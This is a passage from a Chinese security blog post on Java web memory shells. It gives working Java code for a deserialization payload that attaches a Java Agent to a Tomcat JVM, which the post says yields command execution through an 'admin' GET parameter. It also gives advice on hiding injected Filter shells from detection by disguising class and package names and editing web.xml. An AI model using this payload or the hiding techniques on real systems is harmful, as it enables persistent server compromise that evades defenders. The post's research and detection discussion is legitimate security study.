<p>可以发现依赖于<code>tools.jar</code>，这个包对于Tomcat来说并不会自动加载，为了让攻击奏效，我们可以通过<code>JAVA_HOME</code>路径手动加载类型，通过反射执行相关函数</p>
<p>修改后的Payload代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.management.VMManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.RuntimeMXBean;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取进程ID</span></span><br><span class="line">            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();</span><br><span class="line">            Field jvm = runtime.getClass().getDeclaredField(<span class="string">&quot;jvm&quot;</span>);</span><br><span class="line">            jvm.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            VMManagement mgmt = (VMManagement) jvm.get(runtime);</span><br><span class="line">            Method pidMethod = mgmt.getClass().getDeclaredMethod(<span class="string">&quot;getProcessId&quot;</span>);</span><br><span class="line">            pidMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">// 通过反射进行调用</span></span><br><span class="line">            URLClassLoader classLoader = <span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + File.separator + <span class="string">&quot;tools.jar&quot;</span>).toURI().toURL()&#125;);</span><br><span class="line">            Class&lt;?&gt; VirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Method attach = VirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            Method loadAgent=VirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            Method detach=VirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Object virtualMachine = attach.invoke(VirtualMachine,<span class="keyword">new</span> Object[]&#123;String.valueOf(pidMethod.invoke(mgmt))&#125;);</span><br><span class="line">            loadAgent.invoke(virtualMachine,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/tmp/agent.jar&quot;</span>&#125;);</span><br><span class="line">            detach.invoke(virtualMachine);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成反序列化注入Payload后，在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p>
<h2 id="内存马检测和隐藏"><a href="#内存马检测和隐藏" class="headerlink" title="内存马检测和隐藏"></a>内存马检测和隐藏</h2><blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10562">探索Filter型Tomcat内存马的免杀 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me)</a></p>
</blockquote>
<p>对于注入后的内存马，可以分为两个类型</p>
<ul>
<li>组件注入型 - 注入Servlet、Filter、Listener、Controller等</li>
<li>Agent注入型 - 注入字节码</li>
</ul>
<p>检测方面的研究主要有c0ny1师傅的文章</p>
<h3 id="组件注入型的检测和查杀"><a href="#组件注入型的检测和查杀" class="headerlink" title="组件注入型的检测和查杀"></a>组件注入型的检测和查杀</h3><p>可以发现c0ny1师傅给出的方法就是通过加载Java Agent实时获取所有Filter，并且对于可疑的类进行检查</p>
<p>根据4ra1n师傅的方法，我们可以主要通过如下手段来隐藏我们的内存马</p>
<ol>
<li>内存马的类名改为更加合理的，不要使用<code>BackdoorFilter</code>这样显眼的名字，并引入一定的随机化</li>
<li>读取已有Filter的包名，将自己Filter包名改为一致的</li>
<li>自动修改<code>web.xml</code>的内容进行隐藏</li>
</ol>
<p>除此之外，由于可以检查Filter对应的classpath是否存在来检查，我们可以把class文件写入到硬盘上，但是这样就有被HIDS扫描到的风险，应视情况采用</p>
<p>目前为止，如果防御方不把class文件dump出来进行反编译对源码进行分析，应该是很难识别了，如果被dump了的话，只能进一步进采用源码免杀技巧</p>
<h3 id="Agent注入型的检测和查杀"><a href="#Agent注入型的检测和查杀" class="headerlink" title="Agent注入型的检测和查杀"></a>Agent注入型的检测和查杀</h3><p>由于c0ny1师傅的《查杀Java web Agent型内存马》尚未发布，先留个坑在这里</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>JavaWeb 内存马技术归纳</p><p><a href="https://cn.4xpl0r3r.com/技术归纳/JavaWeb-内存马技术归纳/">https://cn.4xpl0r3r.com/技术归纳/JavaWeb-内存马技术归纳/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>4xpl0r3r</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-02-11</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-02-11</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Tomcat/">Tomcat</a><a class="link-muted mr-2" rel="tag" href="/tags/JNDI/">JNDI</a><a class="link-muted mr-2" rel="tag" href="/tags/Java-Web/">Java Web</a><a class="link-muted mr-2" rel="tag" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a><a class="link-muted mr-2" rel="tag" href="/tags/Shell/">Shell</a><a class="link-muted mr-2" rel="tag" href="/tags/ysoserial/">ysoserial</a><a class="link-muted mr-2" rel="tag" href="/tags/Java-Agent/">Java Agent</a><a class="link-muted mr-2" rel="tag" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8F/">恶意代码检测与隐藏</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CVE-2021-4034 Linux Polkit 权限提升漏洞分析</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/"><span class="level-item">CVE-2021-44228 log4j2 RCE 分析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "4746bbfc28d1fd90210393e06013bcfa",
            repo: "Blog-Comments",
            owner: "4xpl0r3r",
            clientID: "9497fa90b0fed6513d24",
            clientSecret: "355dce85acb10c44d73d459e0087635c3d1404cb",
            admin: ["4xpl0r3r"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar1.png" alt="4xpl0r3r"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">4xpl0r3r</p><p class="is-size-6 is-block">OSCE3 | OSCP | CTFer</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Orange Cyberdefense, 上海</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">18</p></a></div></div></nav><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/4xpl0r3r"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:4xpl0r3r@gmail.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="https://api.follow.it/subscription-form/cjhyZGlsVVREaVhUakc2SkdXVFhJY2piZTdyb0hWRmpZSXZ3TytOcGkvSVltWkpEcldmWjhrU1diTmoxemw5alhMSGljZU5nUDFKUE9nS3haUW14OEdmVVRVTnRxZGJ0SExkNWY2b1ArQ05BQm90ZjdsYTV1WWVSL2kzSjI0T0l8QlNwRzQ2VFVoYU9XQ1hvVG0xWTd4OVdaZkxaSnF2Z0huTW9vTjNZQXNGUT0=/8" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#基于JSP-WebShell植入内存马"><span class="level-left"><span class="level-item">基于JSP WebShell植入内存马</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#配置开发环境"><span class="level-left"><span class="level-item">配置开发环境</span></span></a></li><li><a class="level is-mobile" href="#增加Servlet"><span class="level-left"><span class="level-item">增加Servlet</span></span></a></li><li><a class="level is-mobile" href="#增加Filter"><span class="level-left"><span class="level-item">增加Filter</span></span></a></li><li><a class="level is-mobile" href="#增加Listener"><span class="level-left"><span class="level-item">增加Listener</span></span></a></li></ul></li><li><a class="level is-mobile" href="#基于JNDI的内存马植入-以CVE-2021-44228-Log4Shell为例"><span class="level-left"><span class="level-item">基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#准备Tomcat脆弱环境"><span class="level-left"><span class="level-item">准备Tomcat脆弱环境</span></span></a></li><li><a class="level is-mobile" href="#构造Exploit"><span class="level-left"><span class="level-item">构造Exploit</span></span></a></li></ul></li><li><a class="level is-mobile" href="#基于反序列化的内存马植入-ysoserial-CommonsCollections2改造"><span class="level-left"><span class="level-item">基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#配置反序列化环境"><span class="level-left"><span class="level-item">配置反序列化环境</span></span></a></li><li><a class="level is-mobile" href="#构造Exploit-1"><span class="level-left"><span class="level-item">构造Exploit</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Java-Agent内存马"><span class="level-left"><span class="level-item">Java Agent内存马</span></span></a></li><li><a class="level is-mobile" href="#内存马检测和隐藏"><span class="level-left"><span class="level-item">内存马检测和隐藏</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#组件注入型的检测和查杀"><span class="level-left"><span class="level-item">组件注入型的检测和查杀</span></span></a></li><li><a class="level is-mobile" href="#Agent注入型的检测和查杀"><span class="level-left"><span class="level-item">Agent注入型的检测和查杀</span></span></a></li></ul></li></ul></div></div><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.4xpl0r3r.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">切换语言 - English</span></span><span class="level-right"><span class="level-item tag">www.4xpl0r3r.com</span></span></a></li><li><a class="level is-mobile" href="https://github.com/4xpl0r3r" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">GitHub</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="https://www.anquanke.com/member/158068" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">安全客</span></span><span class="level-right"><span class="level-item tag">www.anquanke.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Exploit/"><span class="level-start"><span class="level-item">Exploit</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"><span class="level-start"><span class="level-item">技术归纳</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%96%87%E6%A1%A3/"><span class="level-start"><span class="level-item">文档</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span class="level-start"><span class="level-item">漏洞分析</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-02-14T07:24:26.000Z">2023-02-14</time></p><p class="title"><a href="/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/%E4%BD%BF%E7%94%A8CodeQL%E5%8F%91%E7%8E%B0CVE-2021-44228/">使用CodeQL发现Log4j CVE-2021-44228</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/">技术归纳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-13T12:48:52.000Z">2022-02-13</time></p><p class="title"><a href="/Exploit/%E5%9C%A8Tomcat%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8JNDI%E7%BB%95%E8%BF%87trusted-codebase%E9%99%90%E5%88%B6%E7%9A%84Exploit/">在Tomcat环境下使用JNDI绕过trusted codebase限制的Exploit</a></p><p class="categories"><a href="/categories/Exploit/">Exploit</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-11T11:39:15.000Z">2022-02-11</time></p><p class="title"><a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2021-4034 Linux Polkit 权限提升漏洞分析</a></p><p class="categories"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-11T11:38:47.000Z">2022-02-11</time></p><p class="title"><a href="/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/">JavaWeb 内存马技术归纳</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/">技术归纳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-19T13:06:00.000Z">2022-01-19</time></p><p class="title"><a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/">CVE-2021-44228 log4j2 RCE 分析</a></p><p class="categories"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/C-C/"><span class="tag">C&amp;C++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CodeQL/"><span class="tag">CodeQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JNDI/"><span class="tag">JNDI</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java-Agent/"><span class="tag">Java Agent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java-Web/"><span class="tag">Java Web</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PWN/"><span class="tag">PWN</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Shell/"><span class="tag">Shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tomcat/"><span class="tag">Tomcat</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ysoserial/"><span class="tag">ysoserial</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"><span class="tag">内存马</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8F/"><span class="tag">恶意代码检测与隐藏</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8F%90%E6%9D%83/"><span class="tag">提权</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"><span class="tag">格式化字符串</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%8E%AF%E5%A2%83/"><span class="tag">环境</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">4xpl0r3r</a><p class="is-size-7"><span>&copy; 2023 4xpl0r3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>